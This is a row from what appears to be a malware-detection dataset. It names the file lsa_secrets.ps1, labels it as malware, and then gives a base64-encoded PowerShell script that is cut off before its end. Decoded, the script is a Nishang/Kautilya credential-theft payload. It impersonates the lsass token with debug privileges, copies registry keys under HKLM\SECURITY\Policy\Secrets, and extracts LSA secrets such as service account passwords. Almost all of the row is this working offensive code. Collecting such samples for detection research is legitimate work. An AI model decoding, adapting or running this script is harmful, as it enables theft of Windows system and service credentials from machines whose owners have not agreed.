lsa_secrets.ps1,741c51079c1af8a8e666bd980a6c24a1,Scan result is 32768. IsMalware: 1,CjwjCi5TWU5PUFNJUwpOaXNoYW5nIHBheWxvYWQgbW9kaWZpZWQgZm9yIEthdXRpbHlhIHdoaWNoIGV4dHJhY3RzIExTQSBTZWNyZXRzIGZyb20gbG9jYWwgY29tcHV0ZXIuCgouREVTQ1JJUFRJT04KRXh0cmFjdHMgTFNBIHNlY3JldHMgZnJvbSBIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcIG9uIGEgbG9jYWwgY29tcHV0ZXIuClRoZSBwYXlsb2FkIG11c3QgYmUgcnVuIHdpdGggZWxldmF0ZWQgcGVybWlzc2lvbnMsIGluIDMyLWJpdCBtb2RlIGFuZCByZXF1aXJlcwpwZXJtaXNzaW9ucyB0byB0aGUgc2VjdXJpdHkga2V5IGluIEhLTE0uIFRoZSBwZXJtaXNzaW9uIGNvdWxkIGJlIG9idGFpbmVkIGJ5IHVzaW5nCkVuYWJsZS1EdXBsaWNhdGVUb2tlbiBwYXlsb2FkLiBUaGlzIHNjcmlwdCBtb2RpZmllZCBmb3IgS2F1dGlseWEgYWxyZWFkeSBoYXMgRW5hYmxlLUR1cGxpY2F0ZVRva2VuLgoKLkxJTksKaHR0cDovL3d3dy50cnVlc2VjLmNvbQpodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9oZXlzY3JpcHRpbmdndXkvYXJjaGl2ZS8yMDEyLzA3LzA2L3VzZS1wb3dlcnNoZWxsLXRvLWRlY3J5cHQtbHNhLXNlY3JldHMtZnJvbS10aGUtcmVnaXN0cnkuYXNweApodHRwOi8vY29kZS5nb29nbGUuY29tL3AvbmlzaGFuZwoKLk5PVEVTCkdvdWRlIDIwMTIsIFRyZXVTZWMKIz4KCmZ1bmN0aW9uIGxzYV9zZWNyZXQgewpbQ21kbGV0QmluZGluZygpXQpwYXJhbSgpCgokc2lnbmF0dXJlID0gQCIKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldCiAgICAgcHVibGljIHN0cnVjdCBUb2tQcml2MUx1aWQKICAgICB7CiAgICAgICAgIHB1YmxpYyBpbnQgQ291bnQ7CiAgICAgICAgIHB1YmxpYyBsb25nIEx1aWQ7CiAgICAgICAgIHB1YmxpYyBpbnQgQXR0cjsKICAgICB9CgogICAgcHVibGljIGNvbnN0IGludCBTRV9QUklWSUxFR0VfRU5BQkxFRCA9IDB4MDAwMDAwMDI7CiAgICBwdWJsaWMgY29uc3QgaW50IFRPS0VOX1FVRVJZID0gMHgwMDAwMDAwODsKICAgIHB1YmxpYyBjb25zdCBpbnQgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgPSAweDAwMDAwMDIwOwogICAgcHVibGljIGNvbnN0IFVJbnQzMiBTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgPSAweDAwMEYwMDAwOwoKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgU1RBTkRBUkRfUklHSFRTX1JFQUQgPSAweDAwMDIwMDAwOwogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BU1NJR05fUFJJTUFSWSA9IDB4MDAwMTsKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fRFVQTElDQVRFID0gMHgwMDAyOwogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9JTVBFUlNPTkFURSA9IDB4MDAwNDsKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fUVVFUllfU09VUkNFID0gMHgwMDEwOwogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfR1JPVVBTID0gMHgwMDQwOwogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfREVGQVVMVCA9IDB4MDA4MDsKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQURKVVNUX1NFU1NJT05JRCA9IDB4MDEwMDsKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fUkVBRCA9IChTVEFOREFSRF9SSUdIVFNfUkVBRCB8IFRPS0VOX1FVRVJZKTsKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQUxMX0FDQ0VTUyA9IChTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgfCBUT0tFTl9BU1NJR05fUFJJTUFSWSB8CiAgICAgIFRPS0VOX0RVUExJQ0FURSB8IFRPS0VOX0lNUEVSU09OQVRFIHwgVE9LRU5fUVVFUlkgfCBUT0tFTl9RVUVSWV9TT1VSQ0UgfAogICAgICBUT0tFTl9BREpVU1RfUFJJVklMRUdFUyB8IFRPS0VOX0FESlVTVF9HUk9VUFMgfCBUT0tFTl9BREpVU1RfREVGQVVMVCB8CiAgICAgIFRPS0VOX0FESlVTVF9TRVNTSU9OSUQpOwoKICAgIHB1YmxpYyBjb25zdCBzdHJpbmcgU0VfVElNRV9aT05FX05BTUVURVhUID0gIlNlVGltZVpvbmVQcml2aWxlZ2UiOwogICAgcHVibGljIGNvbnN0IGludCBBTllTSVpFX0FSUkFZID0gMTsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IExVSUQKICAgIHsKICAgICAgcHVibGljIFVJbnQzMiBMb3dQYXJ0OwogICAgICBwdWJsaWMgVUludDMyIEhpZ2hQYXJ0OwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHB1YmxpYyBzdHJ1Y3QgTFVJRF9BTkRfQVRUUklCVVRFUyB7CiAgICAgICBwdWJsaWMgTFVJRCBMdWlkOwogICAgICAgcHVibGljIFVJbnQzMiBBdHRyaWJ1dGVzOwogICAgfQoKCiAgICBwdWJsaWMgc3RydWN0IFRPS0VOX1BSSVZJTEVHRVMgewogICAgICBwdWJsaWMgVUludDMyIFByaXZpbGVnZUNvdW50OwogICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0PUFOWVNJWkVfQVJSQVkpXQogICAgICBwdWJsaWMgTFVJRF9BTkRfQVRUUklCVVRFUyBbXSBQcml2aWxlZ2VzOwogICAgfQoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgICBwdWJsaWMgZXh0ZXJuIHN0YXRpYyBib29sIER1cGxpY2F0ZVRva2VuKEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLCBpbnQKICAgICAgICBTRUNVUklUWV9JTVBFUlNPTkFUSU9OX0xFVkVMLCBvdXQgSW50UHRyIER1cGxpY2F0ZVRva2VuSGFuZGxlKTsKCgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNldFRocmVhZFRva2VuKAogICAgICBJbnRQdHIgUEhUaHJlYWQsCiAgICAgIEludFB0ciBUb2tlbgogICAgKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgT3BlblByb2Nlc3NUb2tlbihJbnRQdHIgUHJvY2Vzc0hhbmRsZSwKICAgICAgIFVJbnQzMiBEZXNpcmVkQWNjZXNzLCBvdXQgSW50UHRyIFRva2VuSGFuZGxlKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9va3VwUHJpdmlsZWdlVmFsdWUoc3RyaW5nIGhvc3QsIHN0cmluZyBuYW1lLCByZWYgbG9uZyBwbHVpZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRXhhY3RTcGVsbGluZyA9IHRydWUsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzKEludFB0ciBodG9rLCBib29sIGRpc2FsbCwKICAgICByZWYgVG9rUHJpdjFMdWlkIG5ld3N0LCBpbnQgbGVuLCBJbnRQdHIgcHJldiwgSW50UHRyIHJlbGVuKTsKIkAKCiAgJGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkKICBpZigkY3VycmVudFByaW5jaXBhbC5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpIC1uZSAkdHJ1ZSkgewogICAgV3JpdGUtV2FybmluZyAiUnVuIHRoZSBDb21tYW5kIGFzIGFuIEFkbWluaXN0cmF0b3IiCiAgICBCcmVhawogIH0KCiAgQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJHNpZ25hdHVyZSAtTmFtZSBBZGpQcml2IC1OYW1lc3BhY2UgQWRqUHJpdgogICRhZGpQcml2ID0gW0FkalByaXYuQWRqUHJpdl0KICBbbG9uZ10kbHVpZCA9IDAKCiAgJHRva1ByaXYxTHVpZCA9IE5ldy1PYmplY3QgQWRqUHJpdi5BZGpQcml2K1Rva1ByaXYxTHVpZAogICR0b2tQcml2MUx1aWQuQ291bnQgPSAxCiAgJHRva1ByaXYxTHVpZC5MdWlkID0gJGx1aWQKICAkdG9rUHJpdjFMdWlkLkF0dHIgPSBbQWRqUHJpdi5BZGpQcml2XTo6U0VfUFJJVklMRUdFX0VOQUJMRUQKCiAgJHJldFZhbCA9ICRhZGpQcml2OjpMb29rdXBQcml2aWxlZ2VWYWx1ZSgkbnVsbCwgIlNlRGVidWdQcml2aWxlZ2UiLCBbcmVmXSR0b2tQcml2MUx1aWQuTHVpZCkKCiAgW0ludFB0cl0kaHRva2VuID0gW0ludFB0cl06Olplcm8KICAkcmV0VmFsID0gJGFkalByaXY6Ok9wZW5Qcm9jZXNzVG9rZW4oJGFkalByaXY6OkdldEN1cnJlbnRQcm9jZXNzKCksIFtBZGpQcml2LkFkalByaXZdOjpUT0tFTl9BTExfQUNDRVNTLCBbcmVmXSRodG9rZW4pCgoKICAkdG9rZW5Qcml2aWxlZ2VzID0gTmV3LU9iamVjdCBBZGpQcml2LkFkalByaXYrVE9LRU5fUFJJVklMRUdFUwogICRyZXRWYWwgPSAkYWRqUHJpdjo6QWRqdXN0VG9rZW5Qcml2aWxlZ2VzKCRodG9rZW4sICRmYWxzZSwgW3JlZl0kdG9rUHJpdjFMdWlkLCAxMiwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKQoKICBpZigtbm90KCRyZXRWYWwpKSB7CiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICBCcmVhawogIH0KCiAgJHByb2Nlc3MgPSAoR2V0LVByb2Nlc3MgLU5hbWUgbHNhc3MpCiAgW0ludFB0cl0kaGxzYXNzdG9rZW4gPSBbSW50UHRyXTo6WmVybwogICRyZXRWYWwgPSAkYWRqUHJpdjo6T3BlblByb2Nlc3NUb2tlbigkcHJvY2Vzcy5IYW5kbGUsIChbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fSU1QRVJTT05BVEUgLUJPUiBbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fRFVQTElDQVRFKSwgW3JlZl0kaGxzYXNzdG9rZW4pCgogIFtJbnRQdHJdJGR1bGljYXRlVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICRyZXRWYWwgPSAkYWRqUHJpdjo6RHVwbGljYXRlVG9rZW4oJGhsc2Fzc3Rva2VuLCAyLCBbcmVmXSRkdWxpY2F0ZVRva2VuSGFuZGxlKQoKICAkcmV0dmFsID0gJGFkalByaXY6OlNldFRocmVhZFRva2VuKFtJbnRQdHJdOjpaZXJvLCAkZHVsaWNhdGVUb2tlbkhhbmRsZSkKICBHZXQtVFNMc2FTZWNyZXQKICBpZigtbm90KCRyZXRWYWwpKSB7CiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgfQp9CgpmdW5jdGlvbiBHZXQtVFNMc2FTZWNyZXQgewoKQmVnaW4gewojIENoZWNrIGlmIFVzZXIgaXMgRWxldmF0ZWQKJGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkKaWYoJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSAtbmUgJHRydWUpIHsKICBXcml0ZS1XYXJuaW5nICJSdW4gdGhlIENvbW1hbmQgYXMgYW4gQWRtaW5pc3RyYXRvciIKICBCcmVhawp9CgojIENoZWNrIGlmIFNjcmlwdCBpcyBydW4gaW4gYSAzMi1iaXQgRW52aXJvbm1lbnQgYnkgY2hlY2tpbmcgYSBQb2ludGVyIFNpemUKaWYoW1N5c3RlbS5JbnRQdHJdOjpTaXplIC1lcSA4KSB7CiAgV3JpdGUtV2FybmluZyAiUnVuIFBvd2VyU2hlbGwgaW4gMzItYml0IG1vZGUiCiAgQnJlYWsKfQoKCgojIENoZWNrIGlmIFJlZ0tleSBpcyBzcGVjaWZpZWQKaWYoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJHJlZ2lzdHJ5S2V5KSkgewogIFtzdHJpbmdbXV0kcmVnaXN0cnlLZXkgPSAoU3BsaXQtUGF0aCAoR2V0LUNoaWxkSXRlbSBIS0xNOlxTRUNVUklUWVxQb2xpY3lcU2VjcmV0cyB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgTmFtZSkgLUxlYWYpCn0KCiMgQ3JlYXRlIFRlbXBvcmFyeSBSZWdpc3RyeSBLZXkKaWYoIC1ub3QoVGVzdC1QYXRoICJIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcTXlTZWNyZXQiKSkgewogIG1rZGlyICJIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcTXlTZWNyZXQiIHwgT3V0LU51bGwKfQoKJHNpZ25hdHVyZSA9IEAiCltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KcHVibGljIHN0cnVjdCBMU0FfVU5JQ09ERV9TVFJJTkcKewogIHB1YmxpYyBVSW50MTYgTGVuZ3RoOwogIHB1YmxpYyBVSW50MTYgTWF4aW11bUxlbmd0aDsKICBwdWJsaWMgSW50UHRyIEJ1ZmZlcjsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IExTQV9PQkpFQ1RfQVRUUklCVVRFUwp7CiAgcHVibGljIGludCBMZW5ndGg7CiAgcHVibGljIEludFB0ciBSb290RGlyZWN0b3J5OwogIHB1YmxpYyBMU0FfVU5JQ09ERV9TVFJJTkcgT2JqZWN0TmFtZTsKICBwdWJsaWMgdWludCBBdHRyaWJ1dGVzOwogIHB1YmxpYyBJbnRQdHIgU2VjdXJpdHlEZXNjcmlwdG9yOwogIHB1YmxpYyBJbnRQdHIgU2VjdXJpdHlRdWFsaXR5T2ZTZXJ2aWNlOwp9CgpwdWJsaWMgZW51bSBMU0FfQWNjZXNzUG9saWN5IDogbG9uZwp7CiAgUE9MSUNZX1ZJRVdfTE9DQUxfSU5GT1JNQVRJT04gPSAweDAwMDAwMDAxTCwKICBQT0xJQ1lfVklFV19BVURJVF9JTkZPUk1BVElPTiA9IDB4MDAwMDAwMDJMLAogIFBPTElDWV9HRVRfUFJJVkFURV9JTkZPUk1BVElPTiA9IDB4MDAwMDAwMDRMLAogIFBPTElDWV9UUlVTVF9BRE1JTiA9IDB4MDAwMDAwMDhMLAogIFBPTElDWV9DUkVBVEVfQUNDT1VOVCA9IDB4MDAwMDAwMTBMLAogIFBPTElDWV9DUkVBVEVfU0VDUkVUID0gMHgwMDAwMDAyMEwsCiAgUE9MSUNZX0NSRUFURV9QUklWSUxFR0UgPSAweDAwMDAwMDQwTCwKICBQT0xJQ1lfU0VUX0RFRkFVTFRfUVVPVEFfTElNSVRTID0gMHgwMDAwMDA4MEwsCiAgUE9MSUNZX1NFVF9BVURJVF9SRVFVSVJFTUVOVFMgPSAweDAwMDAwMTAwTCwKICBQT0xJQ1lfQVVESVRfTE9HX0FETUlOID0gMHgwMDAwMDIwMEwsCiAgUE9MSUNZX1NFUlZFUl9BRE1JTiA9IDB4MDAwMDA0MDBMLAogIFBPTElDWV9MT09LVVBfTkFNRVMgPSAweDAwMDAwODAwTCwKICBQT0xJQ1lfTk9USUZJQ0FUSU9OID0gMHgwMDAwMTAwMEwKfQoKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgUHJlc2VydmVTaWcgPSB0cnVlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBMc2FSZXRyaWV2ZVByaXZhdGVEYXRhKAogIEludFB0ciBQb2xpY3lIYW5kbGUsCiAgcmVmIExTQV9VTklDT0RFX1NUUklORyBLZXlOYW1lLAogIG91dCBJbnRQdHIgUHJpdmF0ZURhdGEKKTsKCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIFByZXNlcnZlU2lnID0gdHJ1ZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTHNhU3RvcmVQcml2YXRlRGF0YSgKICBJbnRQdHIgcG9saWN5SGFuZGxlLAogIHJlZiBMU0FfVU5JQ09ERV9TVFJJTkcgS2V5TmFtZSwKICByZWYgTFNBX1VOSUNPREVfU1RSSU5HIFByaXZhdGVEYXRhCik7CgpbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBQcmVzZXJ2ZVNpZyA9IHRydWUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IExzYU9wZW5Qb2xpY3koCiAgcmVmIExTQV9VTklDT0RFX1NUUklORyBTeXN0ZW1OYW1lLAogIHJlZiBMU0FfT0JKRUNUX0FUVFJJQlVURVMgT2JqZWN0QXR0cmlidXRlcywKICB1aW50IERlc2lyZWRBY2Nlc3MsCiAgb3V0IEludFB0ciBQb2xpY3lIYW5kbGUKKTsKCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIFByZXNlcnZlU2lnID0gdHJ1ZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTHNhTnRTdGF0dXNUb1dpbkVycm9yKAogIHVpbnQgc3RhdHVzCik7CgpbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBQcmVzZXJ2ZVNpZyA9IHRydWUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IExzYUNsb3NlKAogIEludFB0ciBwb2xpY3lIYW5kbGUKKTsKCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIFByZXNlcnZlU2lnID0gdHJ1ZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTHNhRnJlZU1lbW9yeSgKICBJbnRQdHIgYnVmZmVyCik7CiJACgpBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlIC1OYW1lIExTQVV0aWwgLU5hbWVzcGFjZSBMU0FVdGlsCn0KCiAgUHJvY2Vzc3sKICAgIGZvcmVhY2goJGtleSBpbiAkUmVnaXN0cnlLZXkpIHsKICAgICAgJHJlZ1BhdGggPSAiSEtMTTpcXFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXCIgKyAka2V5CiAgICAgICR0ZW1wUmVnUGF0aCA9ICJIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcTXlTZWNyZXQiCiAgICAgICRteUtleSA9ICJNeVNlY3JldCIKICAgICAgaWYoVGVzdC1QYXRoICRyZWdQYXRoKSB7CiAgICAgICAgVHJ5IHsKICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJlZ1BhdGggLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBDYXRjaCB7CiAgICAgICAgICBXcml0ZS1FcnJvciAtTWVzc2FnZSAiQWNjZXNzIHRvIHJlZ2lzdHJ5IERlbmllZCwgcnVuIGFzIE5UIEFVVEhPUklUWVxTWVNURU0iIC1DYXRlZ29yeSBQZXJtaXNzaW9uRGVuaWVkCiAgICAgICAgICBCcmVhawogICAgICAgIH0KCiAgICAgICAgaWYoVGVzdC1QYXRoICRyZWdQYXRoKSB7CiAgICAgICAgICAjIENvcHkgS2V5CiAgICAgICAgICAiQ3VyclZhbCIsIk9sZFZhbCIsIk91cGRUaW1lIiwiQ3VwZFRpbWUiLCJTZWNEZXNjIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJGNvcHlGcm9tID0gIkhLTE06XFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXCIgKyAka2V5ICsgIlwiICsgJF8KICAgICAgICAgICAgJGNvcHlUbyA9ICJIS0xNOlxTRUNVUklUWVxQb2xpY3lcU2VjcmV0c1xNeVNlY3JldFwiICsgJF8KCiAgICAgICAgICAgIGlmKCAtbm90KFRlc3QtUGF0aCAkY29weVRvKSApIHsKICAgICAgICAgICAgICBta2RpciAkY29weVRvIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICAkaXRlbSA9IEdldC1JdGVtUHJvcGVydHkgJGNvcHlGcm9tCiAgICAgICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNvcHlUbyAtTmFtZSAnKGRlZmF1bHQpJyAtVmFsdWUgJGl0ZW0uJyhkZWZhdWx0KScKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJFNjcmlwdDpwYXN0ZXZhbHVlCiAgICAgICAgIyBBdHRyaWJ1dGVzCiAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMgPSBOZXctT2JqZWN0IExTQVV0aWwuTFNBVXRpbCtMU0FfT0JKRUNUX0FUVFJJQlVURVMKICAgICAgICAkb2JqZWN0QXR0cmlidXRlcy5MZW5ndGggPSAwCiAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuUm9vdERpcmVjdG9yeSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuQXR0cmlidXRlcyA9IDAKICAgICAgICAkb2JqZWN0QXR0cmlidXRlcy5TZWN1cml0eURlc2NyaXB0b3IgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRvYmplY3RBdHRyaWJ1dGVzLlNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSA9IFtJbnRQdHJdOjpaZXJvCgogICAgICAgICMgbG9jYWxTeXN0ZW0KICAgICAgICAkbG9jYWxzeXN0ZW0gPSBOZXctT2JqZWN0IExTQVV0aWwuTFNBVXRpbCtMU0FfVU5JQ09ERV9TVFJJTkcKICAgICAgICAkbG9jYWxzeXN0ZW0uQnVmZmVyID0gW0ludFB0cl06Olplcm8KICAgICAgICAkbG9jYWxzeXN0ZW0uTGVuZ3RoID0gMAogICAgICAgICRsb2NhbHN5c3RlbS5NYXhpbXVtTGVuZ3RoID0gMAoKICAgICAgICAjIFNlY3JldCBOYW1lCiAgICAgICAgJHNlY3JldE5hbWUgPSBOZXctT2JqZWN0IExTQVV0aWwuTFNBVXRpbCtMU0FfVU5JQ09ERV9TVFJJTkcKICAgICAgICAkc2VjcmV0TmFtZS5CdWZmZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoJG15S2V5KQogICAgICAgICRzZWNyZXROYW1lLkxlbmd0aCA9IFtVaW50MTZdKCRteUtleS5MZW5ndGggKiBbU3lzdGVtLlRleHQuVW5pY29kZUVuY29kaW5nXTo6Q2hhclNpemUpCiAgICAgICAgJHNlY3JldE5hbWUuTWF4aW11bUxlbmd0aCA9IFtVaW50MTZdKCgkbXlLZXkuTGVuZ3RoICsgMSkgKiBbU3lzdGVtLlRleHQuVW5pY29kZUVuY29kaW5nXTo6Q2hhclNpemUpCgogICAgICAgICMgR2V0IExTQSBQb2xpY3lIYW5kbGUKICAgICAgICAkbHNhUG9saWN5SGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICBbTFNBVXRpbC5MU0FVdGlsK0xTQV9BY2Nlc3NQb2xpY3ldJGFjY2VzcyA9IFtMU0FVdGlsLkxTQVV0aWwrTFNBX0FjY2Vzc1BvbGljeV06OlBPTElDWV9HRVRfUFJJVkFURV9JTkZPUk1BVElPTgogICAgICAgICRsc2FPcGVuUG9saWN5SGFuZGxlID0gW0xTQVV0aWwuTFNBVXRpbF06OkxTQU9wZW5Qb2xpY3koW3JlZl0kbG9jYWxTeXN0ZW0sIFtyZWZdJG9iamVjdEF0dHJpYnV0ZXMsICRhY2Nlc3MsIFtyZWZdJGxzYVBvbGljeUhhbmRsZSkKCiAgICAgICAgaWYoJGxzYU9wZW5Qb2xpY3lIYW5kbGUgLW5lIDApIHsKICAgICAgICAgIFdyaXRlLVdhcm5pbmcgImxzYU9wZW5Qb2xpY3lIYW5kbGUgV2luZG93cyBFcnJvciBDb2RlOiAkbHNhT3BlblBvbGljeUhhbmRsZSIKICAgICAgICAgIENvbnRpbnVlCiAgICAgICAgfQoKICAgICAgICAjIFJldHJpZXZlIFByaXZhdGUgRGF0YQogICAgICAgICRwcml2YXRlRGF0YSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJG50c1Jlc3VsdCA9IFtMU0FVdGlsLkxTQVV0aWxdOjpMc2FSZXRyaWV2ZVByaXZhdGVEYXRhKCRsc2FQb2xpY3lIYW5kbGUsIFtyZWZdJHNlY3JldE5hbWUsIFtyZWZdJHByaXZhdGVEYXRhKQoKICAgICAgICAkbHNhQ2xvc2UgPSBbTFNBVXRpbC5MU0FVdGlsXTo6THNhQ2xvc2UoJGxzYVBvbGljeUhhbmRsZSkKCiAgICAgICAgJGxzYU50U3RhdHVzVG9XaW5FcnJvciA9IFtMU0FVdGlsLkxTQVV0aWxdOjpMc2FOdFN0YXR1c1RvV2luRXJyb3IoJG50c1Jlc3VsdCkKCiAgICAgICAgaWYoJGxzYU50U3RhdHVzVG9XaW5FcnJvciAtbmUgMCkgewogICAgICAgICAgV3JpdGUtV2FybmluZyAibHNhTnRzU3RhdHVzVG9XaW5FcnJvcjogJGxzYU50U3RhdHVzVG9XaW5FcnJvciIKICAgICAgICB9CgogICAgICAgIFtMU0FVdGlsLkxTQVV0aWwrTFNBX1VOSUNPREVfU1RSSU5HXSRsdXNTZWNyZXREYXRhID0KICAgICAgICBbTFNBVXRpbC5MU0FVdGlsK0xTQV9VTklDT0RFX1NUUklOR11bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkcHJpdmF0ZURhdGEsIFtMU0FVdGlsLkxTQVV0aWwrTFNBX1VOSUNPREVfU1RSSU5HXSkKCiAgICAgICAgVHJ5IHsKICAgICAgICAgIFtzdHJpbmddJHZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5tYXJzaGFsXTo6UHRyVG9TdHJpbmdBdXRvKCRsdXNTZWNyZXREYXRhLkJ1ZmZlcikKICAgICAgICAgICR2YWx1ZSA9ICR2YWx1ZS5TdWJTdHJpbmcoMCwgKCRsdXNTZWNyZXREYXRhLkxlbmd0aCAvIDIpKQogICAgICAgIH0KICAgICAgICBDYXRjaCB7CiAgICAgICAgICAkdmFsdWUgPSAiIgogICAgICAgIH0KCiAgICAgICAgaWYoJGtleSAtbWF0Y2ggIl5fU0NfIikgewogICAgICAgICAgIyBHZXQgU2VydmljZSBBY2NvdW50CiAgICAgICAgICAkc2VydmljZU5hbWUgPSAka2V5IC1SZXBsYWNlICJeX1NDXyIKICAgICAgICAgIFRyeSB7CiA